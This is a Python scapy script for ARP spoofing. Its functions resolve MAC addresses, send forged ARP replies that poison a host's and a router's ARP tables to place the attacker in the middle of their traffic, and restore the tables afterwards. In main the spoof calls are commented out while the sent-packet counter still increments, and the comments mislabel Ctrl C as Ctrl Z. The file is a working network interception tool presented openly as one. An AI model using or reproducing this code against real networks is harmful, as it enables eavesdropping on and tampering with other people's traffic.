from scapy.layers.l2 import ARP, Ether, srp
import scapy.all as scapy
import time


def get_mac(ip):
    """
    Retrieves MAC address of target host or target router
    :param ip: Target host or target router IP
    :return: MAC address of given IP
    """
    arp_request = ARP(pdst=ip)  # Create ARP request to ask who has given IP
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')  # Create Ethernet frame and Set destination MAC to broadcast MAC
    arp_request_broadcast = broadcast/arp_request   # Append ARP request to Ethernet frame

    # Send packet and receive answered and unanswered responses
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    """Creates ARP response packet, sends to target IP to spoof"""
    target_mac = get_mac(target_ip)
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send packet to spoof routers MAC
    scapy.send(arp_packet, verbose=False)


def restore_mac_table(destination_ip, source_ip):
    """Restores MAC table to original state when operation complete"""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


def main():
    """
    Main flow of program:
    Continuously send arp response packets to given host and router to position in middle of conversation
    When Ctrl Z detected, restore MAC table to original state
    :return:
    """
    sent_packets_count = 0
    try:
        while True:
            # Spoof router
            #spoof('10.10.0.8', '10.10.0.1')
            # Spoof target
            #spoof('10.10.0.1', '10.10.0.8')
            sent_packets_count += 2
            print(f'\r[+] Packets sent = {sent_packets_count}', end='', flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        print('[+] CTRL Z Detected..Resetting ARP Tables')
        # restore_mac_table('10.10.0.8', '10.10.0.1')
        # restore_mac_table('10.10.0.1', '10.10.0.8')


if __name__ == '__main__':
    main()
